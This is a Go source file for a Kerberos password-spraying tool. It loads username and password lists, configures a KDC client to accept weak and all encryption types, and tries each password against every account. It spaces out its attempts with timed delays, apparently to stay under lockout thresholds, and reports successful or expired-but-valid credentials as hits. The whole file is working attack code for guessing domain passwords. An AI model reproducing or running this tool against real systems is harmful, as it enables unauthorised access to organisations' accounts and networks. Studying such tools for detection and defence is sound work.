package main

import ("fmt"
        "gopkg.in/jcmturner/gokrb5.v6/config"
        "gopkg.in/jcmturner/gokrb5.v6/client"
        "flag"
        "strconv"
        "strings"
        "bufio"
        "os"
        "time"
)

//password and user lists
var passwordList []string

//global kerberos config
var cfg *config.Config

type BruteConfig struct {
    sessionDelay time.Duration
    interDelay time.Duration
    targetRealm string
    targetKdc string
    targetProtocol string
    targetPort int
}

var bruteConfig = &BruteConfig{
                    time.Duration(5),
                    time.Duration(30),
                    "",
                    "",
                    "",
                    88,
                    }

type User struct {
    username string
    discoveredPassword string
}

var userList []User

func main () {
    fmt.Println("HELLOO THIS IS A KERBEROS PASSWORD SPRAYER")
    fmt.Println("INSERT OVERLY LARGE COOL ASCII ART HERE")
    userList = make([]User,0)
    passwordList = make([]string, 0)


    var targetRealm = flag.String("realm", "REALM.COM", "kerberos realm")
    var targetKdc = flag.String("targetKDC", "kdc.realm.com", "kdc server ")
    var targetProtocol = flag.String("protocol", "tcp", "protocol (udp/tcp)")
    var targetPort = flag.Int("port", 88, "KDC Port ")
    var userListFile = flag.String("userfile", "", "username list")
    var pwListFile = flag.String("pwfile", "", "password list")
    var sessionDelay = flag.Int("sessiondelay", 30, "Number of seconds between spraying sessions")
    var interDelay = flag.Int("interDelay", 5, "Number of seconds between each account attempt ")

    flag.Parse()
    bruteConfig.sessionDelay = time.Duration(*sessionDelay)  * time.Second
    bruteConfig.interDelay  = time.Duration(*interDelay) * time.Second

    // construct user list
    userInput := make([]string,0)
    readAllLines(*userListFile, &userInput)
    for _, v := range userInput {
        user := &User {v, ""}
        userList = append(userList, *user)
    }
    readAllLines(*pwListFile, &passwordList)
        // construct a valid realm etc
    fmt.Println("Client Start")
    SetupKerberos(*targetKdc, *targetRealm, *targetProtocol, *targetPort)
    /*
    */
    BreakThings()
}

//-----
// build the kerberos config
// the kerberos libs dont like being configured like this
// but yolo its better than substituting strings
// or writing a config file
func SetupKerberos (targetKdc, targetRealm, targetProtocol string, targetPort int){
    cfg = config.NewConfig()
    // i dont know how much of this is required for this to function
    // as it stands this works with a 2012/2008 DC
    cfg.LibDefaults.DNSLookupKDC = false
    cfg.LibDefaults.DNSLookupRealm = false
    cfg.LibDefaults.Forwardable = true
    cfg.LibDefaults.Proxiable = true
    cfg.LibDefaults.AllowWeakCrypto = true
    cfg.LibDefaults.NoAddresses = true

    //throw it all at the wall and see what sticks.
    types := []int32{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20}
    cfg.LibDefaults.DefaultTGSEnctypeIDs = types
    cfg.LibDefaults.DefaultTktEnctypeIDs = types
    cfg.LibDefaults.PermittedEnctypeIDs = types

    if strings.ToLower(targetProtocol) == "tcp" {
        fmt.Println("Forcing TCP Mode")
        cfg.LibDefaults.UDPPreferenceLimit = 1
    }

    // this config pattern will cover most kerberos installs
    cfg.DomainRealm[targetRealm] = strings.ToUpper(targetRealm)
    cfg.DomainRealm["." + targetRealm] = strings.ToUpper(targetRealm)


    // make some realms
    realms := &config.Realm {
        Realm: strings.ToUpper(targetRealm),
        DefaultDomain : targetRealm,
    }
    realms.KDC = append(realms.KDC, targetKdc + ":" + strconv.Itoa(targetPort))
    cfg.Realms = append(cfg.Realms,*realms)

    bruteConfig.targetRealm = targetRealm
    bruteConfig.targetProtocol = targetProtocol
    bruteConfig.targetPort = targetPort

}


//------------------
// cycle over each password trying it with each user
// after each user wait for interdelay seconds
// at the end of a cycle of users wait sessiondelay-timetaken seconds
func BreakThings(){
    cycle := 0
    for _, p := range passwordList {

        fmt.Println("Starting cycle ", cycle, " - ", p )
        startTime := time.Now()
        for _, u := range userList {
            if u.discoveredPassword != "" {
                fmt.Println(u, " - skipping")
		//dont skip, it ruins the timings
            }
            pwStartTime := time.Now()
            fmt.Print(u.username)
            cl := client.NewClientWithPassword(u.username, strings.ToUpper(bruteConfig.targetRealm), p)
            cl.GoKrb5Conf.DisablePAFXFast = true
            cl.WithConfig(cfg)

            err := cl.Login()
            found := false
            if err == nil {
                found = true
            } else {
                if strings.Contains(err.Error(), "KDC_ERR_KEY_EXPIRED"){
                   fmt.Print(" - expired but valid")
                   found = true
                }
            //    fmt.Println(err)
            }

            if found {
                fmt.Println(" - HIT!")
                u.discoveredPassword = p
            }
            pwAttemptLength := time.Since(pwStartTime)
            time.Sleep(bruteConfig.interDelay - pwAttemptLength)
        }
        cycleLength := time.Since(startTime)
        fmt.Println("Cycle took ", cycleLength, " cycledelay is ", bruteConfig.sessionDelay)
        cycleWait := bruteConfig.sessionDelay - cycleLength
        time.Sleep(cycleWait)
        cycle++

    }
}

func readAllLines(filename string, outdata *[]string){
    file, err := os.Open(filename)
    if err != nil {
        fmt.Println("error loading ", filename)
        panic (err)
    }
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        *outdata = append(*outdata, scanner.Text())
    }
    fmt.Println("loaded ", len(*outdata), "lines")

}
